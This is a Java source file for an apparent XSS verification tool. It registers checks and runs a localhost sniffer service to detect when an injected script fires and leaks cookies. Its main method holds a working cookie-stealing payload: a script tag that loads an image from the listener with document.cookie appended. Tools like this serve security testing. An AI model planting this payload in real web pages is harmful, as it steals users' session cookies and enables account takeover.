import org.apache.log4j.Logger;

import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by Ilya Evlampiev on 16.06.15.
 */
public class XSSVerifier {
    private static Map<Integer,XSSCheck> xssChecks = new HashMap<Integer,XSSCheck>();
    private static Map<Integer,SnifferService> snifferServices = new HashMap<Integer,SnifferService>();

    private static final Logger log = Logger.getLogger(XSSVerifier.class);

    public static XSSCheck createNewCheck(int port, String resource, String scriptTemplate)
    {
        log.info(MessageFormat.format(
                "XSS Verifier is requested to create XSS checker with port {0,number}, resource {1} and script template {2}", port, resource, scriptTemplate));
        XSSCheck toAdd=new XSSCheck("localhost",port, resource,scriptTemplate);
        xssChecks.put(toAdd.getPort(), toAdd);
        log.info("XSS check is registered");
        if (snifferServices.get(toAdd.getPort())!=null)
        {
            log.info("XSS check was requested for the Sniffer Service already running on the port "+port);
            snifferServices.get(toAdd.getPort()).addXSSCheck(toAdd);
        }
        else
        {
            log.info("XSS check was requested for the Sniffer Service not existing yet on the port "+port);
            SnifferService snf=new SnifferService(toAdd.getPort());
            snf.addXSSCheck(toAdd);
            snifferServices.put(toAdd.getPort(),snf);
        }
        return toAdd;
    }

    public static void main(String[] args) throws InterruptedException {
        XSSCheck x=XSSVerifier.createNewCheck(4567,"xss.git","<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>");
        while (!x.getXSSURLCalledStatus())
        {
            Thread.sleep(1000);
            System.out.println("wait 1...");
        }
        while (!x.getXSSCookiePassedStatus())
        {
            Thread.sleep(1000);
            System.out.println("wait 2...");
        }
        while (!x.getXSSCookieHijacked("visited"))
        {
            Thread.sleep(1000);
            System.out.println("wait 3...");
        }
    }
}
